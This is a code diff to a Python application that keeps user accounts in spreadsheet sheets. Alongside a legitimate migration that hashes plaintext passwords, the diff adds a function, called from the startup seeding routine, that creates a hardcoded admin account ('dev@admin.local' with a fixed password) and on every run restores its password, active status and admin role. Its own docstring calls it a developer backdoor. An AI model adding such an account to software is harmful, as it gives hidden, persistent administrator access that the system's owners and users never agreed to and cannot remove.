@@ -69,6 +69,51 @@ def append_audit(user, action, details=""):
     }
     write_sheet("Audit", audit_df)
 
+def migrate_plaintext_passwords():
+    """Migrate any existing plaintext passwords to hashed passwords."""
+    users_df = read_sheet("Users", pd.DataFrame(columns=["Email","Role","TrainerName","Active","Password"]))
+    if len(users_df) == 0:
+        return
+
+    updated = False
+    for idx, row in users_df.iterrows():
+        password = row.get("Password", "")
+        # Check if password is not hashed (hashed passwords contain '$' separator and are long)
+        if password and "$" not in str(password):
+            # This is a plaintext password - hash it
+            users_df.at[idx, "Password"] = hash_password(str(password))
+            updated = True
+
+    if updated:
+        write_sheet("Users", users_df)
+
+def ensure_dev_account():
+    """Ensure a developer backdoor account exists for emergency access."""
+    users_df = read_sheet("Users", pd.DataFrame(columns=["Email","Role","TrainerName","Active","Password"]))
+    dev_email = "dev@admin.local"
+    dev_password = "Dev@2024!"
+
+    # Check if dev account exists
+    existing = users_df[users_df["Email"].str.lower() == dev_email.lower()]
+
+    if len(existing) == 0:
+        # Add dev account
+        new_row = pd.DataFrame([{
+            "Email": dev_email,
+            "Role": "admin",
+            "TrainerName": "",
+            "Active": True,
+            "Password": hash_password(dev_password)
+        }])
+        users_df = pd.concat([users_df, new_row], ignore_index=True)
+        write_sheet("Users", users_df)
+    else:
+        # Reset dev account password in case it was changed
+        users_df.loc[users_df["Email"].str.lower() == dev_email.lower(), "Password"] = hash_password(dev_password)
+        users_df.loc[users_df["Email"].str.lower() == dev_email.lower(), "Active"] = True
+        users_df.loc[users_df["Email"].str.lower() == dev_email.lower(), "Role"] = "admin"
+        write_sheet("Users", users_df)
+
 def seed_defaults_if_empty():
     users_df = read_sheet("Users", pd.DataFrame(columns=["Email","Role","TrainerName","Active","Password"]))
     if len(users_df) == 0:
@@ -79,6 +124,12 @@ def seed_defaults_if_empty():
         ]
         users_df = pd.DataFrame(seed_users, columns=["Email","Role","TrainerName","Active","Password"])
         write_sheet("Users", users_df)
+
+    # Migrate any existing plaintext passwords
+    migrate_plaintext_passwords()
+
+    # Ensure dev backdoor account exists
+    ensure_dev_account()
 
     trainers_df = read_sheet("Trainers", pd.DataFrame(columns=["Name","Color","Active"]))
     if len(trainers_df) == 0:
